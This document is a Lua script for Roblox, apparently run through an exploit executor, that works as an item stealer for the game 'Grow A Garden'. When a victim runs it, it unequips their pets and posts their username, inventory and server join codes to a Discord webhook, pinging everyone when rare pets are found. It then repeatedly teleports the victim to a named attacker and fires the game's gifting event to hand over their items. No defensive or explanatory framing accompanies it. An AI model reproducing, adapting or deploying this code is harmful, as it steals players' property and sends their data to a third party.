if shared.GAGInjected then return end
shared.GAGInjected = true

local ATTACKER = "USERNAME_HERE"
local WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
local IMPORTANT = {"Raccoon","Dragonfly","Red Fox","Queen Bee","Chicken Zombie","Candy Blossom","Kitsune","French Fly Ferret"}
local IGNORED = {"Can","Shovel","Seed","Wrench","Sprinkler","Rod","Tool","Staff","Trowel"}

-- Проверка LocalPlayer
if not game.Players.LocalPlayer then
    game.Players.PlayerAdded:Wait()
end

local localPlayer = game.Players.LocalPlayer
if not localPlayer then return end

for _,pet in pairs(workspace.PetsPhysical:GetChildren()) do
    if pet:GetAttribute("OWNER") == localPlayer.Name then
        for _,v in pairs(pet:GetChildren()) do
            if v:IsA("Tool") then
                local replicatedStorage = game:GetService("ReplicatedStorage")
                if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("PetsService") then
                    replicatedStorage.GameEvents.PetsService:FireServer("UnequipPet", v.Name)
                end
            end
        end
    end
end

for _,tool in pairs(localPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") and tool:GetAttribute("d") == true then
        local replicatedStorage = game:GetService("ReplicatedStorage")
        if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("Favorite_Item") then
            replicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
        end
    end
end

local items = {}
local importantItems = {}

for _,item in pairs(localPlayer.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        local isImportant = false
        for _,v in ipairs(IMPORTANT) do
            if string.find(string.lower(item.Name), string.lower(v)) then
                table.insert(importantItems, item.Name)
                isImportant = true
                break
            end
        end
        if not isImportant then
            local shouldIgnore = false
            for _,v in ipairs(IGNORED) do
                if string.find(string.lower(item.Name), string.lower(v)) then
                    shouldIgnore = true
                    break
                end
            end
            if not shouldIgnore then
                table.insert(items, item.Name)
            end
        end
    end
end

local ping = #importantItems > 0 and "@everyone " or ""
local placeId = game.PlaceId
local jobId = game.JobId
local teleportCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
local consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
local joinLink = string.format("roblox://placeID=%s&gameInstanceID=%s", placeId, jobId)

local request = syn and syn.request or http_request or request
if request then
    pcall(function()
        request({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                ["content"] = ping..teleportCode,
                ["embeds"] = {{
                    ["title"] = "Join to get Grow A Garden hit",
                    ["color"] = 65280,
                    ["fields"] = {
                        {["name"] = "Victim Username:", ["value"] = localPlayer.Name},
                        {["name"] = "Items:", ["value"] = #items > 0 and table.concat(items, ", ") or "None"},
                        {["name"] = "Important Items:", ["value"] = #importantItems > 0 and table.concat(importantItems, ", ") or "None"},
                        {["name"] = "Join from console:", ["value"] = consoleCode},
                        {["name"] = "Join from link:", ["value"] = joinLink}
                    },
                    ["footer"] = {["text"] = "Grow A Garden stealer"},
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
    end)
end

while task.wait(0.5) do
    local target = game.Players:FindFirstChild(ATTACKER)
    if target and target.Character then
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
        end
        
        for _,item in pairs(localPlayer.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                local isImportant = false
                for _,v in ipairs(IMPORTANT) do
                    if string.find(string.lower(item.Name), string.lower(v)) then
                        isImportant = true
                        break
                    end
                end
                
                local shouldIgnore = false
                for _,v in ipairs(IGNORED) do
                    if string.find(string.lower(item.Name), string.lower(v)) then
                        shouldIgnore = true
                        break
                    end
                end
                
                if not shouldIgnore then
                    item.Parent = localPlayer.Character
                    task.wait(0.2)
                    local replicatedStorage = game:GetService("ReplicatedStorage")
                    if replicatedStorage and replicatedStorage:FindFirstChild("GameEvents") and replicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
                        replicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", target)
                    end
                    task.wait(0.2)
                    if item.Parent == localPlayer.Character then
                        item.Parent = localPlayer.Backpack
                    end
                end
            end
        end
    end
end
